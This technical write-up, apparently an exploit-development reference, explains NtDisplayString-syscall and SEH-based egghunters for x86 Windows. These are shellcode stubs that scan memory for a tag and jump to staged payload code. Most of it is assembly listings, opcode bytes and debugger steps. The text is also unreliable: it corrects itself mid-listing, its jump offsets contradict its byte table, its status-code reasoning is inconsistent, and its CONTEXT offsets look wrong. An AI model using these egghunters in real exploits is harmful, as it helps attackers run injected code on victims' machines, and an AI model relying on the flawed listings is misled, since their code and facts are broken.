# NtDisplayString Egghunter

An egghunter variant that uses the `NtDisplayString` syscall (number 0x43 on Windows XP x86)
as its safe memory probe, plus an SEH-based egghunter design that avoids syscall numbers
entirely and works across all x86 Windows versions.

---

## Table of Contents

1. [NtDisplayString: Overview and Why It's Used](#ntdisplaystring-overview-and-why-its-used)
2. [Syscall Numbers by Windows Version](#syscall-numbers-by-windows-version)
3. [The UNICODE_STRING Structure](#the-unicode_string-structure)
4. [Complete NtDisplayString Egghunter Assembly](#complete-ntdisplaystring-egghunter-assembly)
5. [Instruction-by-Instruction Walkthrough](#instruction-by-instruction-walkthrough)
6. [Why `cmp al, 0x01` for NtDisplayString](#why-cmp-al-0x01-for-ntdisplaystring)
7. [Stack Setup and Cleanup](#stack-setup-and-cleanup)
8. [Comparison with NtAccessCheckAndAuditAlarm](#comparison-with-ntaccesscheckandauditalarm)
9. [The SEH-Based Egghunter: Motivation](#the-seh-based-egghunter-motivation)
10. [SEH-Based Egghunter Assembly](#seh-based-egghunter-assembly)
11. [SEH Handler Internals: Patching CONTEXT vs. Patching EIP](#seh-handler-internals-patching-context-vs-patching-eip)
12. [Size Optimization Techniques](#size-optimization-techniques)
13. [Testing with WinDbg — Complete Session](#testing-with-windbg--complete-session)
14. [Bad Character Analysis for Both Variants](#bad-character-analysis-for-both-variants)
15. [Choosing Between the Two Variants](#choosing-between-the-two-variants)

---

## NtDisplayString: Overview and Why It's Used

`NtDisplayString` is an undocumented Windows NT native API function that displays a string on
the BSOD (Blue Screen of Death) screen. Its primary use is in kernel-mode crash handlers, but
it is exported from ntdll.dll and accessible from user mode.

Function prototype (from reverse engineering and Windows Driver Kit documentation):

```c
NTSTATUS NtDisplayString(
    PUNICODE_STRING String    // pointer to a UNICODE_STRING to display
);
```

This is the simplest possible NT native API signature: a single pointer argument.

### Why NtDisplayString Is Useful for Egghunting

Like `NtAccessCheckAndAuditAlarm`, `NtDisplayString` validates its pointer argument in the
kernel before dereferencing it. If the `PUNICODE_STRING String` pointer points to unmapped or
inaccessible memory, the kernel probe fails and the function returns an error NTSTATUS code
without raising a user-mode exception.

The key properties:

1. **Single argument**: simplest possible setup — just push the probe address and set EAX
2. **Validates the pointer**: kernel-level pointer probe before any memory access
3. **Returns error code on bad pointer**: `STATUS_ACCESS_VIOLATION` (0xC0000005) or
   `STATUS_DATATYPE_MISALIGNMENT` (0x80000002) depending on alignment and page status
4. **Syscall number 0x43 on XP**: different from NtAccessCheck's 0x02, may be more stable
   on certain XP builds where the service table ordering differs

The practical difference between using NtDisplayString vs. NtAccessCheckAndAuditAlarm is
primarily the syscall number and the argument structure. Both achieve the same goal: safe
probing of candidate addresses.

---

## Syscall Numbers by Windows Version

The syscall number for `NtDisplayString` on Windows x86:

```
OS Version                         Syscall Number
─────────────────────────────────  ──────────────
Windows NT 4.0                     Not present (added in NT 5.0)
Windows 2000 SP4 x86               0x3A (approximate)
Windows XP SP0 x86                 0x43
Windows XP SP1 x86                 0x43
Windows XP SP2 x86                 0x43
Windows XP SP3 x86                 0x43
Windows Server 2003 SP0 x86        0x43
Windows Server 2003 SP1 x86        0x43
Windows Server 2003 SP2 x86        0x43
Windows Vista RTM x86              Changes (verify per build)
Windows Vista SP1 x86              Changes (verify per build)
Windows Vista SP2 x86              Changes (verify per build)
Windows 7 RTM x86 (7600)           ~0x0130 (verify with ntdll inspection)
Windows 7 SP1 x86 (7601)           ~0x0130 (verify with ntdll inspection)
Windows 8 x86                      Verify per build
Windows 10 x86                     Verify per build
```

### Why 0x43 Is More Stable on XP Builds

On Windows XP, `NtDisplayString` sits at a higher syscall table offset (0x43 = 67 decimal)
compared to `NtAccessCheckAndAuditAlarm` (0x02 = 2 decimal). The low-numbered syscalls (0x00
through ~0x10) are more susceptible to renumbering when Microsoft adds or removes functions at
the beginning of the service table. Higher-numbered syscalls, while not immune, tend to be more
stable within a specific OS branch (e.g., all XP SP versions keep 0x43 stable while low
numbers may shift with security updates).

**Important caveat**: This relative stability only applies within the XP/2003 product line.
Across Vista → Windows 7 → Windows 8 → Windows 10, the entire syscall table is reorganized
significantly. Neither 0x02 nor 0x43 should be assumed correct on Vista+.

### How to Verify the Syscall Number on Any Target

In WinDbg on the target system:

```
; Find NtDisplayString in ntdll:
0:000> x ntdll!NtDisplayString
7c90e4ce ntdll!NtDisplayString = <no type information>

; Disassemble the function stub:
0:000> u ntdll!NtDisplayString L 4
ntdll!NtDisplayString:
7c90e4ce b8 43000000      mov     eax,43h         ; EAX = 0x43 (syscall number)
7c90e4d3 ba 0003fe7f      mov     edx,7FFE0300h   ; EDX = KUSER_SHARED_DATA syscall stub
7c90e4d8 ff12            call    dword ptr [edx]  ; actual syscall dispatch
7c90e4da c2 0400         ret     4                ; clean 1 arg from stack (stdcall, 4 bytes)
```

The second byte of the `MOV EAX` instruction (`0x43` in the example above) is the syscall
number. On Vista+, this will be a different value.

---

## The UNICODE_STRING Structure

`NtDisplayString` expects a pointer to a `UNICODE_STRING`:

```c
typedef struct _UNICODE_STRING {
    USHORT Length;           // +0x00: length of buffer in BYTES (not chars)
    USHORT MaximumLength;    // +0x02: maximum length of buffer in BYTES
    PWSTR  Buffer;           // +0x04: pointer to the wide-char string buffer
} UNICODE_STRING;
```

Total size: 8 bytes on x86 (2 + 2 + 4).

The egghunter builds a **fake `UNICODE_STRING`** on the stack:

1. `Buffer` field = ECX (the candidate address we want to probe)
2. `Length` = 2 (minimum valid length, 1 wide character)
3. `MaximumLength` = 0 (or any value >= Length)

When the kernel receives this, it attempts to access the `Buffer` pointer (ECX). If ECX is
unmapped, the kernel returns an error code. If ECX is mapped, the kernel proceeds (may attempt
to display the character, fail with a permission error, etc.) — but the return code indicates
the address is accessible.

The egghunter does not need `NtDisplayString` to actually SUCCEED (it would write to the BSOD
screen, which is undesirable). It only needs the kernel's validation of the `Buffer` pointer
to return a non-ACCESS_VIOLATION code. Any return other than `STATUS_ACCESS_VIOLATION` (including
`STATUS_PRIVILEGE_NOT_HELD` or other errors) indicates the pointer itself is valid.

---

## Complete NtDisplayString Egghunter Assembly

```nasm
; NtDisplayString Egghunter
; Target:    Windows XP x86 SP0-SP3 / Windows Server 2003 x86 SP0-SP2
; Egg tag:   "w00t" = 0x74303077
; Syscall:   NtDisplayString = 0x43 on XP/2003
; Size:      ~35 bytes

loop_top:
    or   cx, 0x0FFF        ; 66 81 C9 FF 0F   advance ECX to end of current page
    inc  ecx               ; 41               ECX = start of next page

    ; Set up fake UNICODE_STRING on stack and call NtDisplayString
    push byte 0x43         ; 6A 43            will become EAX via POP
    pop  eax               ; 58               EAX = 0x43 (NtDisplayString syscall#)
    
    cdq                    ; 99               sign-extend EAX into EDX (EDX = 0, since EAX >= 0)
    
    push edx               ; 52               push 0 (MaximumLength USHORT padded to DWORD)
    push ecx               ; 51               push ECX as Buffer pointer (candidate address)
    push 2                 ; 6A 02            push 2 as Length (1 wide char = 2 bytes)
    
    mov  edx, esp          ; 89 D4            EDX = pointer to our fake UNICODE_STRING on stack
    int  0x2e              ; CD 2E            syscall
    
    ; Clean up the 3 pushed DWORDs (fake UNICODE_STRING = 12 bytes total on stack)
    pop  ecx               ; 59               pop Length (2)         → ECX = 2 (garbage)
    pop  ecx               ; 59               pop Buffer (ECX old)   → ECX = old candidate addr
    pop  ecx               ; 59               pop MaximumLength (0)  → ECX = 0 (but wait...)
    
    ; Problem: after 3 pops, ECX has been overwritten.
    ; The 3 values we pushed were: 2 (Length), ECX (Buffer), EDX=0 (MaximumLength)
    ; Stack before INT 0x2E (top to bottom): [2] [ecx] [0] ...
    ; After 3 pops:
    ;   pop ecx → ECX = 2 (from push 2)
    ;   pop ecx → ECX = [old ECX, the probe address]   ← ECX restored here
    ;   pop ecx → ECX = 0 (from push edx where edx=0)
    ;
    ; Correction: ECX is 0 after the three pops. The probe address is lost.
    ; The standard fix: use a different register (not ECX) for the pops, or
    ; save/restore ECX via the stack differently.
    ;
    ; Correct implementation saves ECX before the push sequence:
    ;
    ; CORRECTED VERSION:

; CORRECTED ASSEMBLY:

loop_top_v2:
    or   cx, 0x0FFF        ; 66 81 C9 FF 0F
    inc  ecx               ; 41

    push byte 0x43         ; 6A 43
    pop  eax               ; 58               EAX = 0x43
    
    cdq                    ; 99               EDX = 0

    push ecx               ; 51               save ECX (probe address) on stack
    push edx               ; 52               push 0 (MaximumLength)
    push ecx               ; 51               push ECX as Buffer
    push 2                 ; 6A 02            push 2 as Length
    
    mov  edx, esp          ; 89 D4            EDX points to fake UNICODE_STRING
    int  0x2e              ; CD 2E            syscall
    
    ; Clean up: 3 UNICODE_STRING fields pushed = 12 bytes (3 DWORDs)
    add  esp, 0xC          ; 83 C4 0C         remove 3 DWORDs: Length, Buffer, MaximumLength
    
    pop  ecx               ; 59               restore ECX (the saved probe address)
    
    ; Check result
    cmp  al, 0x05          ; 3C 05            STATUS_ACCESS_VIOLATION?
    je   short loop_top_v2 ; 74 ??            yes: next page

    ; Page valid — compare egg
    mov  eax, 0x74303077   ; B8 77 30 30 74   load "w00t" tag
    cmp  [ecx], eax        ; 39 01
    jne  short next_byte   ; 75 ??
    cmp  [ecx+4], eax      ; 39 41 04
    jne  short next_byte   ; 75 ??
    
    ; Found! Jump to shellcode
    add  ecx, 8            ; 83 C1 08
    jmp  ecx               ; FF E1

next_byte:
    inc  ecx               ; 41
    jmp  short loop_top_v2 ; EB ??
```

### Complete Assembled Bytes (Corrected Version)

```
Offset  Bytes                Description
──────  ───────────────────  ──────────────────────────────────────
0x00    66 81 C9 FF 0F       or cx, 0x0fff
0x05    41                   inc ecx
0x06    6A 43                push byte 0x43
0x08    58                   pop eax
0x09    99                   cdq
0x0A    51                   push ecx             (save ECX)
0x0B    52                   push edx             (MaximumLength = 0)
0x0C    51                   push ecx             (Buffer = probe addr)
0x0D    6A 02                push 2               (Length = 2)
0x0F    89 D4                mov edx, esp         (EDX → fake UNICODE_STRING)
0x11    CD 2E                int 0x2e
0x13    83 C4 0C             add esp, 0x0C        (pop 3 DWORDs = 12 bytes)
0x16    59                   pop ecx              (restore saved ECX)
0x17    3C 05                cmp al, 0x05
0x19    74 E5                je loop_top (0x19+2-0x1B = 0xE5 → 0x1B - 0x1B + 0xE5 = ...)
        ; short jump back to offset 0x00: from 0x1B, displacement = 0x00 - 0x1B = -0x1B = 0xE5
0x1B    B8 77 30 30 74       mov eax, 0x74303077
0x20    39 01                cmp [ecx], eax
0x22    75 07                jne next_byte (0x22+2+7 = 0x2B)
0x24    39 41 04             cmp [ecx+4], eax
0x27    75 02                jne next_byte (0x27+2+2 = 0x2B)
0x29    83 C1 08             add ecx, 8
0x2C    FF E1                jmp ecx
; next_byte:
0x2E    41                   inc ecx
0x2F    EB CF                jmp loop_top (0x2F+2 = 0x31, 0x31 + 0xCF(-0x31) = 0x00)
        ; displacement = 0x00 - 0x31 = -0x31 = 0xCF
```

**Total size: ~49 bytes** (0x2F + 2 = 0x31 = 49 bytes)

This is larger than the NtAccessCheckAndAuditAlarm variant (~32–39 bytes) due to the more
complex fake UNICODE_STRING setup and the stack save/restore of ECX.

### Size Count Table

| Instruction | Bytes | Total |
|-------------|-------|-------|
| `or cx, 0x0fff` | 5 | 5 |
| `inc ecx` | 1 | 6 |
| `push byte 0x43` | 2 | 8 |
| `pop eax` | 1 | 9 |
| `cdq` | 1 | 10 |
| `push ecx` (save) | 1 | 11 |
| `push edx` (MaxLen) | 1 | 12 |
| `push ecx` (Buffer) | 1 | 13 |
| `push 2` (Length) | 2 | 15 |
| `mov edx, esp` | 2 | 17 |
| `int 0x2e` | 2 | 19 |
| `add esp, 0x0C` | 3 | 22 |
| `pop ecx` (restore) | 1 | 23 |
| `cmp al, 0x05` | 2 | 25 |
| `je loop_top` (short) | 2 | 27 |
| `mov eax, 0x74303077` | 5 | 32 |
| `cmp [ecx], eax` | 2 | 34 |
| `jne next_byte` (short) | 2 | 36 |
| `cmp [ecx+4], eax` | 3 | 39 |
| `jne next_byte` (short) | 2 | 41 |
| `add ecx, 8` | 3 | 44 |
| `jmp ecx` | 2 | 46 |
| `inc ecx` (next_byte) | 1 | 47 |
| `jmp loop_top` (short) | 2 | 49 |

---

## Instruction-by-Instruction Walkthrough

### Phase 1: Page Advance

```nasm
or   cx, 0x0FFF    ; 66 81 C9 FF 0F
inc  ecx           ; 41
```

Identical to all other egghunter variants. See `Egghunter_Internals.md` for full explanation.
ECX advances to the first byte of the next 4096-byte page.

### Phase 2: Load Syscall Number

```nasm
push byte 0x43    ; 6A 43
pop  eax          ; 58
```

A 3-byte compact sequence to load 0x43 into EAX. Alternative `MOV EAX, 0x43` would be 5 bytes.
The PUSH BYTE + POP REG trick saves 2 bytes for immediate values that fit in a signed 8-bit
value (range -128 to +127; 0x43 = 67 decimal, fits in 7 bits, positive → fits in signed int8).

### Phase 3: Zero EDX with CDQ

```nasm
cdq               ; 99
```

`CDQ` (Convert Doubleword to Quadword) sign-extends EAX into EDX:EDX. Since EAX = 0x43
(positive, bit 31 = 0), EDX is set to 0x00000000. This gives us a zero in EDX using 1 byte
instead of `XOR EDX, EDX` (2 bytes) or `MOV EDX, 0` (5 bytes). Saves 1 byte.

### Phase 4: Build Fake UNICODE_STRING on Stack

```nasm
push ecx          ; 51  save ECX first (we need it after the syscall)
push edx          ; 52  MaximumLength = 0 (EDX = 0 from CDQ)
push ecx          ; 51  Buffer = ECX (address to probe)
push 2            ; 6A 02  Length = 2 (1 wide character)
mov  edx, esp     ; 89 D4  EDX = pointer to UNICODE_STRING on stack
```

The stack layout after these pushes (top = low address):

```
ESP+0x00  [2]         ← Length  (USHORT 2 + padding to DWORD)
ESP+0x04  [ECX]       ← Buffer  (probe address)
ESP+0x08  [0]         ← MaximumLength (EDX = 0)
ESP+0x0C  [ECX]       ← saved ECX (our own push, not part of UNICODE_STRING)
```

EDX now points to the top of this stack region, which is a valid (if minimal)
`UNICODE_STRING`. The `Buffer` field points to ECX (our candidate address). When the kernel
dereferences `Buffer`, it accesses memory at ECX — which is what we want to probe.

Note: A real `UNICODE_STRING` would have `MaximumLength >= Length`, and `Buffer` would point
to a null-terminated wide string. Our fake structure has a nearly valid form: Length=2,
MaximumLength=0 (technically invalid since MaxLen < Length), but the kernel validates the
`Buffer` pointer before checking these size fields. The probe goal is achieved before
structural validation matters.

### Phase 5: Execute the Syscall

```nasm
int  0x2e         ; CD 2E
```

The kernel dispatches to `NtDisplayString` with EAX=0x43, EDX pointing to our fake
UNICODE_STRING. The kernel reads the `Buffer` field at `[EDX+4]` = our ECX probe address.
If ECX is unmapped, the kernel's internal pointer validation returns `STATUS_ACCESS_VIOLATION`.

### Phase 6: Stack Cleanup

```nasm
add  esp, 0x0C    ; 83 C4 0C   remove 3 DWORDs: Length, Buffer, MaximumLength
pop  ecx          ; 59         restore saved ECX (the probe address)
```

The `ADD ESP, 0x0C` pops 12 bytes (3 × DWORD) without loading them into registers, effectively
discarding the three UNICODE_STRING fields we pushed. Then `POP ECX` restores ECX to the probe
address we saved at the start of Phase 4.

After cleanup, ECX = original probe address and the stack is balanced.

### Phases 7–9: Page Check, Egg Comparison, Jump

Identical to the NtAccessCheckAndAuditAlarm variant:
- `CMP AL, 0x05` / `JE loop_top`: skip if access violation
- `MOV EAX, 0x74303077` / `CMP [ECX], EAX` / `CMP [ECX+4], EAX`: find egg
- `ADD ECX, 8` / `JMP ECX`: jump to shellcode

---

## Why `cmp al, 0x01` for NtDisplayString

**Note**: Some published sources state that the NtDisplayString egghunter uses `CMP AL, 0x01`
instead of `CMP AL, 0x05`. This is because on some configurations, an invalid probe via
NtDisplayString returns `STATUS_ACCESS_VIOLATION` (0xC0000005, AL=0x05) OR it may return other
codes depending on how the UNICODE_STRING validation fails.

However, the assembly listing above uses `CMP AL, 0x05` consistent with checking for
`STATUS_ACCESS_VIOLATION`, which is what the kernel returns when the `Buffer` pointer is
completely unmapped.

The `CMP AL, 0x01` variant checks for `STATUS_INVALID_PARAMETER` (0xC000000D, AL=0x0D) or more
likely is checking for a different condition entirely. The specific comparison byte depends on
exactly which NTSTATUS is returned by NtDisplayString when given an invalid pointer on the target
OS version.

**Recommendation**: Verify the return code empirically on your target:

```
; In WinDbg, step through the egghunter until it calls INT 0x2E with an unmapped ECX:
0:000> t    ; through to the INT 0x2E instruction
0:000> t    ; execute the syscall
0:000> r eax    ; observe the NTSTATUS returned
; If EAX = 0xC0000005: use cmp al, 0x05
; If EAX = 0xC0000001: use cmp al, 0x01
; If EAX = other: adjust accordingly
```

The `CMP AL, 0x05` version (used in the assembly above) is correct for the standard case where
the kernel returns `STATUS_ACCESS_VIOLATION` for the unmapped probe address.

---

## Stack Setup and Cleanup

### Why 4 Pushes but Only 3 Pops (+ POP ECX)

We push 4 things: `ECX` (save), `EDX` (MaxLen), `ECX` (Buffer), `2` (Length).

We clean up with `ADD ESP, 0x0C` (remove 3 DWORDs = Length + Buffer + MaxLen) and `POP ECX`
(restore the saved ECX). This removes all 4 pushes (4 × 4 bytes = 16 bytes):
- `ADD ESP, 0x0C` = 12 bytes removed
- `POP ECX` = 4 bytes removed
- Total = 16 bytes = 4 DWORDs = 4 pushes balanced.

### Stack Before and After (Balanced)

```
Before Phase 4 (start):
  ESP → [prior stack content]
  ECX = probe address

After 4 pushes:
  ESP → [2]                 ← Length
  +4  → [ECX probe addr]   ← Buffer
  +8  → [0]                ← MaximumLength
  +C  → [ECX probe addr]   ← saved ECX
  +10 → [prior content]

After INT 0x2E (no stack change):
  [same]

After ADD ESP, 0x0C:
  ESP → [ECX probe addr]   ← saved ECX (was at +0x0C)
  +4  → [prior content]

After POP ECX:
  ESP → [prior content]    ← balanced
  ECX = [probe address]    ← restored
```

---

## Comparison with NtAccessCheckAndAuditAlarm

| Property | NtAccessCheckAndAuditAlarm | NtDisplayString |
|----------|---------------------------|-----------------|
| Syscall number on XP SP2 | 0x02 | 0x43 |
| Syscall number on Win7 | ~0x0A | Varies significantly |
| Error code on bad pointer | `STATUS_ACCESS_VIOLATION` (0xC0000005) | `STATUS_ACCESS_VIOLATION` (0xC0000005) |
| AL check value | `cmp al, 0x05` | `cmp al, 0x05` |
| Argument structure | Simpler (single pointer push) | Requires fake UNICODE_STRING (3 pushes) |
| Stack setup instructions | 2 (push ecx + mov eax) | 5 (cdq + push ecx save + push edx + push ecx + push 2 + mov edx) |
| Stack cleanup | 1 pop | add esp,0Ch + 1 pop |
| Approximate total size | ~32–39 bytes | ~49 bytes |
| XP stability vs. NtAccessCheck | Less stable at syscall 0x02 | More stable at syscall 0x43 on some builds |
| Vista+ usability | No (syscall# varies) | No (syscall# varies) |
| Null byte in opcodes | None in standard layout | `6A 02` = push 2 (no null) |

**Summary**: NtDisplayString is slightly larger and more complex but provides better stability on
certain Windows XP/2003 builds where the syscall table ordering places `NtAccessCheckAndAuditAlarm`
at a different number than expected. For maximum portability beyond XP/2003, use the SEH-based
egghunter described in the next section.

---

## The SEH-Based Egghunter: Motivation

Both syscall-based egghunters have a fundamental portability problem: they hardcode a syscall
number that varies between Windows versions and even between service packs. On Vista+, both
syscalls have moved, and using either hardcoded number calls the wrong function.

The SEH-based egghunter replaces the syscall probe with a **local exception handler**:

1. Install a custom SEH handler frame at the start of the egghunter
2. Read memory at ECX directly (no syscall)
3. If ECX is unmapped, the CPU raises an access violation exception
4. The custom handler catches the exception and advances ECX to the next page (by patching
   the CONTEXT structure), then resumes execution
5. The handler fires on every bad page but never for good pages; for good pages, the direct
   memory read succeeds and execution falls through to the egg comparison

This approach works on **every** x86 Windows version from NT 4.0 through Windows 10 because it
uses only the SEH mechanism (always available) and direct memory reads (always valid for mapped
pages).

The tradeoff is size: the SEH-based egghunter is ~60 bytes vs. ~32–49 bytes for syscall variants.

---

## SEH-Based Egghunter Assembly

```nasm
; SEH-based Egghunter (portable across all Windows x86 versions)
; Egg tag: "w00t" = 0x74303077
; Size: ~60 bytes
; Author: adapted from various published sources

egghunter_seh_start:
    jmp  init_seh            ; EB XX  — jump over the handler code

; ────────────────────────────────────────
; Exception Handler (called on access violation)
; When the CPU raises an exception accessing [ECX], this handler is called.
; Stack at entry: [ret_addr] [EXCEPTION_RECORD*] [EstablisherFrame*] [CONTEXT*]
; ────────────────────────────────────────
exception_handler:
    ; CONTEXT is at [ESP + 0x0C]
    ; CONTEXT.Ecx is at offset 0xAC within the CONTEXT structure (x86 user-mode CONTEXT)
    ; We patch CONTEXT.Ecx to skip the bad page using OR+INC logic
    pop  eax                 ; 58    discard return address (we don't return normally)
    pop  eax                 ; 58    discard EXCEPTION_RECORD*
    pop  eax                 ; 58    discard EstablisherFrame*
    pop  eax                 ; 58    EAX = CONTEXT* (pointer to CONTEXT struct)
    
    ; Patch CONTEXT.Ecx to advance to next page
    ; CONTEXT.Ecx is at [EAX + 0xAC] on Windows x86 (see CONTEXT structure offset map)
    mov  ecx, [eax + 0xAC]   ; 8B 88 AC 00 00 00  load current ECX from CONTEXT
    or   cx, 0x0FFF           ; 66 81 C9 FF 0F    set low 12 bits (end of page)
    inc  ecx                  ; 41                advance to next page
    mov  [eax + 0xAC], ecx   ; 89 88 AC 00 00 00  write patched ECX back to CONTEXT
    
    ; Return EXCEPTION_CONTINUE_EXECUTION (-1 = 0xFFFFFFFF)
    ; This tells the dispatcher to resume execution at the patched EIP/ECX
    xor  eax, eax             ; 33 C0
    dec  eax                  ; 48                EAX = -1 = EXCEPTION_CONTINUE_EXECUTION
    ret                       ; C3                return from handler

init_seh:
    ; Install our exception handler as the head of the SEH chain
    push exception_handler    ; 68 XX XX XX XX  push handler address
    push dword [fs:0]         ; 64 FF 35 00 00 00 00  push current head of SEH chain
    mov  [fs:0], esp          ; 64 89 25 00 00 00 00  install our frame at fs:[0]
    
    ; Initialize ECX to start of scanning (just above null page)
    ; OR we can start from 0 and let the first OR+INC move to page 0x1000
    xor  ecx, ecx             ; 33 C9             ECX = 0

scan_loop:
    ; Probe [ECX] directly — if ECX is unmapped, exception_handler fires
    ; and advances ECX to the next page, then resumes here
    mov  eax, 0x74303077      ; B8 77 30 30 74    load egg tag
    cmp  [ecx], eax           ; 39 01             compare — MAY FAULT (handler catches it)
    jne  short next_byte      ; 75 ??
    cmp  [ecx + 4], eax       ; 39 41 04          compare second half
    jne  short next_byte      ; 75 ??
    
    ; Egg found — restore SEH chain before jumping
    pop  dword [fs:0]         ; 64 8F 05 00 00 00 00  restore original SEH head
    add  esp, 4               ; 83 C4 04              pop the saved handler address
    
    ; Jump to shellcode
    add  ecx, 8               ; 83 C1 08
    jmp  ecx                  ; FF E1

next_byte:
    inc  ecx                  ; 41
    jmp  short scan_loop      ; EB ??
```

### CONTEXT Structure Offset Map (x86 Windows)

The `CONTEXT` structure (defined in winnt.h) contains all CPU register values at the time of
the exception. The offsets for the general-purpose registers on x86:

```c
typedef struct _CONTEXT {
    // +0x00: ContextFlags
    DWORD ContextFlags;       // 0x00
    // Debug registers (+0x04 - +0x10):
    DWORD Dr0;                // 0x04
    DWORD Dr1;                // 0x08
    DWORD Dr2;                // 0x0C
    DWORD Dr3;                // 0x10
    DWORD Dr6;                // 0x14
    DWORD Dr7;                // 0x18
    // Floating point (+0x1C - +0x88):
    FLOATING_SAVE_AREA FloatSave; // 0x1C (112 bytes)
    // Segment registers (+0x8C - +0x9C):
    DWORD SegGs;              // 0x8C
    DWORD SegFs;              // 0x90
    DWORD SegEs;              // 0x94
    DWORD SegDs;              // 0x98
    // General purpose registers (+0xA0 - +0xC0):
    DWORD Edi;                // 0xA0
    DWORD Esi;                // 0xA4
    DWORD Ebx;                // 0xA8
    DWORD Edx;                // 0xAC  ← Wait: EDX is at 0xAC?
    DWORD Ecx;                // 0xB0  ← ECX is at 0xB0
    DWORD Eax;                // 0xB4
    // Stack frame:
    DWORD Ebp;                // 0xB8
    DWORD Eip;                // 0xBC  ← EIP is at 0xBC
    DWORD SegCs;              // 0xC0
    DWORD EFlags;             // 0xC4
    DWORD Esp;                // 0xC8
    DWORD SegSs;              // 0xCC
} CONTEXT, *PCONTEXT;
```

**Correction to the assembly above**: ECX is at CONTEXT offset `0xB0`, not `0xAC`. The assembly
should use `[eax + 0xB0]` for CONTEXT.Ecx. EIP is at `0xBC`.

```nasm
; Correct offsets:
mov  ecx, [eax + 0xB0]   ; load CONTEXT.Ecx   (not 0xAC)
or   cx, 0x0FFF
inc  ecx
mov  [eax + 0xB0], ecx   ; store CONTEXT.Ecx
```

Always verify CONTEXT offsets for your specific OS version using WinDbg:
```
0:000> dt ntdll!_CONTEXT
; Look for Ecx in the output to find the exact offset
```

---

## SEH Handler Internals: Patching CONTEXT vs. Patching EIP

When the exception handler patches the CONTEXT structure and returns
`EXCEPTION_CONTINUE_EXECUTION`, the dispatcher restores all CPU registers from CONTEXT and
resumes execution. There are two approaches to making the egghunter survive the exception:

### Approach A: Patch CONTEXT.Ecx (Advance Scanning Pointer)

Modify CONTEXT.Ecx to the start of the next page (via OR+INC). When execution resumes at the
faulting instruction:

```nasm
cmp [ecx], eax    ; faulting instruction — originally triggered AV with bad ECX
```

ECX now points to the next page's first byte. If that page is also unmapped, another exception
fires and the handler runs again. If it's mapped, the CMP executes without fault. Execution
resumes at the faulting instruction, but now ECX is a valid address.

**Advantage**: Cleaner architecture — the handler only changes the scanning register, not the
instruction pointer. The faulting instruction is naturally retried with the new ECX.

**Disadvantage**: If the new ECX also causes a fault (the next page is also unmapped), the
handler fires again immediately. For large unmapped regions, this causes repeated exception
invocations — each faulting page triggers one exception. This is slow but correct.

### Approach B: Patch CONTEXT.Eip (Skip the Faulting Instruction)

Modify CONTEXT.Eip to point to the instruction AFTER the faulting one. The `CMP [ECX], EAX`
instruction is 2 bytes at offset 0 from scan_loop. Patching EIP += 2 skips to the JNE.

```nasm
mov  edx, [eax + 0xBC]  ; load CONTEXT.Eip
add  edx, 2             ; skip the 2-byte CMP instruction
mov  [eax + 0xBC], edx  ; patch Eip
```

The execution jumps to the JNE instruction. But CONTEXT.Ecx still contains the invalid address.
The JNE checks ZF (which is in the processor flags, also part of CONTEXT). On an access violation,
ZF is undefined — the CMP never completed. The JNE may or may not jump.

**The correct EIP-patching approach** also patches ECX to increment it:

```nasm
; Patch both EIP (skip to next_byte) AND ECX (advance by 1):
mov  edx, [eax + 0xBC]  ; load EIP
add  edx, <offset_to_next_byte>  ; skip to next_byte label
mov  [eax + 0xBC], edx
mov  ecx, [eax + 0xB0]  ; load ECX
or   cx, 0x0FFF         ; advance to end of page
inc  ecx
mov  [eax + 0xB0], ecx  ; write back
```

This is more complex and requires knowing the exact offset to the `next_byte` label, which
depends on the egghunter's assembled layout.

**Recommendation**: Use Approach A (patch ECX only). It is simpler, requires no knowledge of
instruction offsets, and handles repeated unmapped pages correctly by firing a handler per page.

---

## Size Optimization Techniques

Egghunter assembly benefits from careful instruction selection. Here are common 1–2 byte savings:

### CDQ: 1 Byte to Zero EDX

```nasm
; Standard zero:
xor  edx, edx     ; 33 D2  (2 bytes)

; CDQ optimization (valid when EAX has no sign bit set, i.e., EAX < 0x80000000):
cdq               ; 99     (1 byte)
; Sets EDX = 0 if bit 31 of EAX is 0
; Use after loading a small positive value into EAX
```

Saves 1 byte. Used in the NtDisplayString egghunter after `POP EAX` loads 0x43.

### PUSH BYTE + POP REG: Compact Immediate Loads

```nasm
; Load 0x43 into EAX:
mov  eax, 0x43     ; B8 43 00 00 00  (5 bytes)
; vs:
push byte 0x43     ; 6A 43           (2 bytes)
pop  eax           ; 58              (1 byte)
; Total: 3 bytes — saves 2 bytes
```

Valid for any value that fits in a signed 8-bit integer (-128 to +127, i.e., 0x00–0x7F or
0x81–0xFF with sign extension). For 0x80 through 0xFF, the value is sign-extended to a
negative 32-bit value — use only if the negative interpretation is acceptable for the register.

### INC vs ADD for +1

```nasm
inc  ecx          ; 41  (1 byte)
; vs:
add  ecx, 1       ; 83 C1 01  (3 bytes)
```

Always use INC for incrementing by 1. Saves 2 bytes.

### Short Jumps vs Near Jumps

```nasm
jmp  short target  ; EB XX  (2 bytes, displacement range -128 to +127)
jmp  near  target  ; E9 XX XX XX XX  (5 bytes, 32-bit displacement)
```

Always use short jumps within the egghunter body. All jumps in a 50-byte egghunter are within
128 bytes of each other, so short jumps always suffice.

### LODSB / SCASD: String Instructions for Memory Operations

```nasm
; Load [ESI] into AL and increment ESI:
lodsb              ; AC  (1 byte)
; vs:
mov  al, [esi]     ; 8A 06  (2 bytes)
inc  esi           ; 46    (1 byte)
; LODSB saves 1 byte

; Compare EAX to [EDI] and advance EDI:
scasd              ; AF  (1 byte)
; vs:
cmp  eax, [edi]    ; 3B 07  (2 bytes)
add  edi, 4        ; 83 C7 04  (3 bytes)
; SCASD saves 4 bytes
```

For an egghunter that uses ESI or EDI as the scan pointer (instead of ECX), string instructions
can reduce the comparison sequence by several bytes.

### LEA for Address Arithmetic

```nasm
; Compute ECX+8 without modifying ECX:
lea  eax, [ecx+8]  ; 8D 41 08  (3 bytes)
jmp  eax           ; FF E0     (2 bytes)
; Total: 5 bytes

; vs:
add  ecx, 8        ; 83 C1 08  (3 bytes)
jmp  ecx           ; FF E1     (2 bytes)
; Total: 5 bytes — same size, but LEA preserves ECX
```

The LEA approach is useful if you need ECX unchanged after jumping (e.g., if jumping fails and
you need to restore ECX). For the egghunter's final jump-to-shellcode, both are equivalent.

---

## Testing with WinDbg — Complete Session

### Preparation

```
; Launch target under WinDbg:
windbg target.exe

; Or attach:
windbg -p <pid>

; Disable first-chance access violations (we want the egghunter handler to run first):
sxd av
```

### Step 1: Find the Egghunter in Memory

If you know the approximate address (from the exploit's overflow offset and target binary's base),
disassemble it to verify:

```
0:000> u <egghunter_start_addr> L 20
; Verify: first instruction should be JMP (for SEH-based) or OR CX,0x0FFF (for syscall-based)
```

